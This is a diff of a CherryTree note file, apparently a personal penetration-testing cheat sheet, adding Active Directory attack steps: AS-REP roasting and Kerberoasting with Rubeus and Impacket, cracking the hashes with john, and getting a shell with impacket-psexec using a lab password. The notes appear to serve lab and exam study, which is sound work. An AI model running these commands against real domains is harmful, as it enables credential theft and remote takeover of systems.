@@ -1653,7 +1653,7 @@ crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq</code
           <codebox char_offset="198" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">
 
 </codebox>
-          <node name="ASRreproasting" unique_id="90" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687808714" ts_lastsave="1698812222">
+          <node name="ASRreproasting" unique_id="90" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687808714" ts_lastsave="1707853423">
             <rich_text scale="h1">Request AS_REP message</rich_text>
             <rich_text>
 
@@ -1708,12 +1708,11 @@ or
 impacket-GetNPUsers domain.local/admin -request -no-pass -dc-ip 10.11.1.
 </codebox>
             <codebox char_offset="63" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GetNPUsers blackfield.local/ -dc-ip 10.11.1.</codebox>
-            <codebox char_offset="69" justification="left" frame_width="1682" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
-Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
+            <codebox char_offset="69" justification="left" frame_width="2086" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
 
 </codebox>
           </node>
-          <node name="Kerberoasting" unique_id="101" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697239770" ts_lastsave="1697242037">
+          <node name="Kerberoasting" unique_id="101" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697239770" ts_lastsave="1707857270">
             <rich_text>• </rich_text>
             <rich_text link="webs https://adsecurity.org/?p=3458">https://adsecurity.org/?p=3458</rich_text>
             <rich_text>
@@ -1723,6 +1722,8 @@ Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github
 • </rich_text>
             <rich_text link="webs https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast</rich_text>
             <rich_text>
+
+
 
 
 </rich_text>
@@ -1736,6 +1737,12 @@ Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github
 
 or
 
+
+</rich_text>
+            <rich_text justification="left"></rich_text>
+            <rich_text>
+
+Ex:
 
 </rich_text>
             <rich_text justification="left"></rich_text>
@@ -1757,11 +1764,23 @@ once we get the password we should use psexec to get a shell
 Ex:
 </rich_text>
             <rich_text justification="left"></rich_text>
-            <codebox char_offset="224" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GetUserSPNs -hashes &lt;lmhash&gt;:&lt;nthash&gt; htb.local/username -outputfile hashes.txt</codebox>
-            <codebox char_offset="233" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GetUserSPNs -request -dc-ip 10.11.1. &lt;DOMAIN.FULL&gt;/&lt;USERNAME&gt; -outputfile hashes.kerberoast</codebox>
-            <codebox char_offset="275" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">john admin.txt --wordlist=/usr/share/wordlists/rockyou.txt</codebox>
-            <codebox char_offset="341" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec /&lt;user&gt;:&lt;Password&gt;@10.11.1.</codebox>
-            <codebox char_offset="347" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec /Administrator:Ticketmaster1968@10.11.1.</codebox>
+            <codebox char_offset="226" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GetUserSPNs -hashes &lt;lmhash&gt;:&lt;nthash&gt; htb.local/username -outputfile hashes.txt</codebox>
+            <codebox char_offset="235" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GetUserSPNs -request -dc-ip 10.11.1. &lt;DOMAIN.FULL&gt;/&lt;USERNAME&gt; -outputfile hashes.kerberoast</codebox>
+            <codebox char_offset="243" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
+impacket-GetUserSPNs -request -dc-ip 10.11.1 domain.local/user -outputfile hashes.kerberoast
+
+
+
+or u can run it without password
+
+
+
+Impacket-GetUserSPN -request -dc-ip 10.11.1. domain.local/user --no-pass -outputfile hashes.kerberoast
+
+</codebox>
+            <codebox char_offset="285" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">john admin.txt --wordlist=/usr/share/wordlists/rockyou.txt</codebox>
+            <codebox char_offset="351" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec /&lt;user&gt;:&lt;Password&gt;@10.11.1.</codebox>
+            <codebox char_offset="357" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec /Administrator:Ticketmaster1968@10.11.1.</codebox>
           </node>
         </node>
         <node name="Impacket" unique_id="83" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690727" ts_lastsave="1690043804">
@@ -1885,15 +1904,58 @@ or
 impacket-GetADUsers domain/user:password@IP</codebox>
             <codebox char_offset="114" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GETADUsers -all domain.local/user -dc-ip 10.11.1.</codebox>
           </node>
-          <node name="GetUserSPNs - get TGTs" unique_id="88" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690781">
+          <node name="GetUserSPNs - get TGTs" unique_id="88" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1707857540">
             <rich_text>
 </rich_text>
             <rich_text scale="h3">Get TGT for kerberoastable users</rich_text>
             <rich_text>
 
+
 </rich_text>
             <rich_text justification="left"></rich_text>
-            <codebox char_offset="35" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Impacket-GetUserSPN -request -dc-ip 10.11.1. domain.local/user</codebox>
+            <rich_text>
+
+or u can run it without password
+
+</rich_text>
+            <rich_text justification="left"></rich_text>
+            <rich_text>
+
+
+or
+
+if you get the following error:
+
+
+u need to use dc-host instead of dc-ip with the host name of the domain controller (added in /etc/hosts) 
+
+
+
+
+
+once done we can crack it using john
+
+</rich_text>
+            <rich_text justification="left"></rich_text>
+            <rich_text>
+
+
+once we get the password we should use psexec to get a shell
+
+</rich_text>
+            <rich_text justification="left"></rich_text>
+            <rich_text>
+Ex:
+</rich_text>
+            <rich_text justification="left"></rich_text>
+            <codebox char_offset="36" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Impacket-GetUserSPN -request -dc-ip 10.11.1. domain.local/user </codebox>
+            <codebox char_offset="73" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Impacket-GetUserSPN -request -dc-ip 10.11.1. domain.local/user --no-pass</codebox>
+            <codebox char_offset="113" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Getting machine hostname
+[-] The SMB request is not supported. Probably NTLM is disabled. Try to specify corresponding NetBIOS name or FQDN as the value of the -dc-host option</codebox>
+            <codebox char_offset="224" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GetUserSPNs -request -dc-host dc1.scrm.local scrm.local/ksimpson:ksimpson -outputfile hashes.kerberoast -k</codebox>
+            <codebox char_offset="266" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">john hashes.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt</codebox>
+            <codebox char_offset="332" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec /&lt;user&gt;:&lt;Password&gt;@10.11.1.</codebox>
+            <codebox char_offset="338" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec /Administrator:Ticketmaster1968@10.11.1.</codebox>
           </node>
           <node name="impacket-addcomputer" unique_id="96" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690042606" ts_lastsave="1690043170">
             <rich_text>
